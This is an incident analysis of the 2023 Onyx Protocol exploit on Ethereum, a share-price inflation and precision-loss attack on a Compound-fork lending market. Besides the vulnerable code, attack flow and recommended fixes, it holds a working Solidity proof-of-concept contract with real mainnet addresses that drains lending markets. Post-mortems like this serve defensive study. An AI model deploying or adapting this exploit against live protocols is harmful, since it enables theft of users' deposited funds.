# OnyxProtocol Precision Loss Attack Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Onyx Protocol |
| Date | 2023-11-01 |
| Chain | Ethereum Mainnet |
| Loss | ~$2,100,000 USD |
| Attack Type | Flash Loan + Share Price Inflation + Precision Loss Liquidation |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0x085bdff2c522e8637d4154039db8746bb8642bff` |
| Attack Contract | `0x526e8e98356194b64eae4c2d443cc8aad367336f` |
| Vulnerable Contract | `0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750` (oPEPE) |
| Fork Block | 18,476,512 |

## 2. Vulnerability Code Analysis

Onyx Protocol is a Compound fork-based lending protocol. The oPEPE market contained share price manipulation and precision loss vulnerabilities. The attacker minted a large amount of oPEPE, then immediately redeemed `totalSupply - 2` to inflate the share price to an extreme level. In this state, the attacker borrowed from other markets (oETHER, oUSDC, oUSDT, etc.) to maximize liquidation profits.

```solidity
// Vulnerable pattern: Compound fork share price manipulation
contract oPEPE is CToken {
    // exchangeRate can be manipulated when totalSupply is very small
    function exchangeRateStoredInternal() internal view returns (uint) {
        uint _totalSupply = totalSupply;
        if (_totalSupply == 0) {
            return initialExchangeRateMantissa;
        }
        uint totalCash = getCashPrior();
        uint cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;
        // Vulnerable: exchangeRate increases to extreme values when totalSupply is 1~2
        uint exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;
        return exchangeRate;
    }
}
```

**Vulnerability**: When `totalSupply` is 2 or less, `exchangeRate` (underlying asset value per share) becomes extremely inflated. In this state, using oPEPE as collateral allows borrowing large amounts with a tiny quantity of oPEPE. The `liquidateCalculateSeizeTokens()` calculation also uses this distorted exchangeRate, causing liquidators to receive far more oPEPE than they should during liquidation.

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: OErc20Delegator.sol
     * @param decimals_ ERC-20 decimal precision of this token  // ❌

// ...

    function accrueInterest() public returns (uint) {
        bytes memory data = delegateToImplementation(abi.encodeWithSignature("accrueInterest()"));
        return abi.decode(data, (uint));
    }
```

## 3. Attack Flow

```
Attacker [0x085bdff2c522e8637d4154039db8746bb8642bff]
  │
  ├─1─▶ AaveV3.flashLoanSimple(PEPE, large amount)
  │      [Aave Pool: 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2]
  │      executeOperation callback triggered
  │
  ├─2─▶ PEPE.approve(oPEPE, max)
  │      oPEPE.mint(1e18)
  │      [oPEPE: 0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750]
  │      Mint oPEPE worth 1 PEPE
  │
  ├─3─▶ oPEPE.redeem(totalSupply - 2)
  │      Redeem nearly all → only totalSupply = 2 remains
  │      redeemAmount = PEPE.balanceOf(this) - 1
  │
  ├─4─▶ PEPE.transfer(oPEPE, PEPE.balanceOf(this))
  │      Direct transfer massively inflates oPEPE underlying balance
  │      → exchangeRate spikes to extreme level
  │
  ├─5─▶ Comptroller.enterMarkets([oPEPE])
  │      [Unitroller: 0x7D61ed92a6778f5ABf5c94085739f1EDAbec2800]
  │      Register oPEPE as collateral
  │
  ├─6─▶ oETHER.borrow(oETHER.getCash() - 1)
  │      Borrow large amount of ETH using inflated exchangeRate
  │
  ├─7─▶ ETH → transferred to attacker
  │
  ├─8─▶ oPEPE.redeemUnderlying(redeemAmt)
  │      Recover remaining PEPE
  │
  ├─9─▶ Exploit liquidateCalculateSeizeTokens() calculation
  │      Receive additional oPEPE via liquidation incentive
  │      → mint(mintAmount) to issue additional oPEPE
  │
  └─10─▶ Repay Aave flash loan + realize ~$2.1M profit
          (oUSDC, oUSDT, oWBTC, and other markets)
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract IntermediateContractETH {
    IERC20 PEPE = IERC20(0x6982508145454Ce325dDbE47a25d4ec3d2311933);
    ICErc20Delegate oPEPE = ICErc20Delegate(payable(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750));
    crETH oETHER = crETH(payable(0x714bD93aB6ab2F0bcfD2aEaf46A46719991d0d79));
    IComptroller Unitroller = IComptroller(0x7D61ed92a6778f5ABf5c94085739f1EDAbec2800);

    function start() external {
        PEPE.approve(address(oPEPE), type(uint256).max);

        // Share price manipulation: mint → redeem(totalSupply-2) → direct transfer
        oPEPE.mint(1e18);
        oPEPE.redeem(oPEPE.totalSupply() - 2);
        uint256 redeemAmt = PEPE.balanceOf(address(this)) - 1;
        PEPE.transfer(address(oPEPE), PEPE.balanceOf(address(this)));

        // Register collateral and borrow ETH
        address[] memory oTokens = new address[](1);
        oTokens[0] = address(oPEPE);
        Unitroller.enterMarkets(oTokens);
        oETHER.borrow(oETHER.getCash() - 1);

        // Return ETH
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success);

        // Recover remaining PEPE
        oPEPE.redeemUnderlying(redeemAmt);

        // Receive additional oPEPE by exploiting liquidation calculation
        (,,, uint256 exchangeRate) = oPEPE.getAccountSnapshot(address(this));
        (, uint256 numSeizeTokens) = Unitroller.liquidateCalculateSeizeTokens(
            address(oETHER), address(oPEPE), 1
        );
        uint256 mintAmount = (exchangeRate / 1e18) * numSeizeTokens - 2;
        oPEPE.mint(mintAmount);
        PEPE.transfer(msg.sender, PEPE.balanceOf(address(this)));
    }

    receive() external payable {}
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Compound fork share price inflation, exchangeRate manipulation when totalSupply=2 |
| Impact Scope | All Onyx Protocol markets (oETHER, oUSDC, oUSDT, oWBTC, oPEPE) |
| Explorer | [Etherscan](https://etherscan.io/address/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750) |

## 6. Security Recommendations

```solidity
// Fix 1: Enforce minimum totalSupply (dead shares)
uint256 constant MINIMUM_SHARES = 1000;

function mint(uint256 mintAmount) external returns (uint256) {
    // On first mint, lock MINIMUM_SHARES to address(0)
    if (totalSupply == 0) {
        _mint(address(0), MINIMUM_SHARES);
        // Also deposit MINIMUM_SHARES worth of underlying assets initially
    }
    // ...
}

// Fix 2: Block redemptions that would reduce totalSupply below threshold
function redeem(uint256 redeemTokens) external returns (uint256) {
    require(totalSupply - redeemTokens >= MINIMUM_SHARES || msg.sender == address(0),
            "Would reduce supply below minimum");
    // ...
}

// Fix 3: Detect sudden spikes in exchangeRate
uint256 public lastExchangeRate;
uint256 public constant MAX_RATE_CHANGE = 10; // Block changes greater than 10x

function _checkExchangeRate() internal {
    uint256 newRate = exchangeRateStoredInternal();
    if (lastExchangeRate > 0) {
        require(newRate <= lastExchangeRate * MAX_RATE_CHANGE,
                "Exchange rate spike detected");
    }
    lastExchangeRate = newRate;
}
```

## 7. Lessons Learned

1. **Compound fork share manipulation**: When `totalSupply` drops to 2 or below, `exchangeRate` can increase by hundreds of thousands of times or more. Compound fork protocols must enforce a minimum share count when adding initial liquidity.
2. **Dead shares pattern**: Just as Uniswap V2 locks 1000 LP tokens to `address(0)` on the first liquidity provision, lending protocols must also lock a minimum number of shares to a burn address on the first mint.
3. **ERC-4626 standard solution**: The EIP-4626 vault standard addresses this problem via a `_decimalsOffset()` offset. Compound forks should implement a similar defense.
4. **Cascading losses across multiple markets**: A single vulnerability in oPEPE caused cascading losses across the entire protocol — oETHER, oUSDC, oUSDT, oWBTC, and more. When adding new markets to a lending protocol, share manipulation scenarios must be tested as a mandatory step.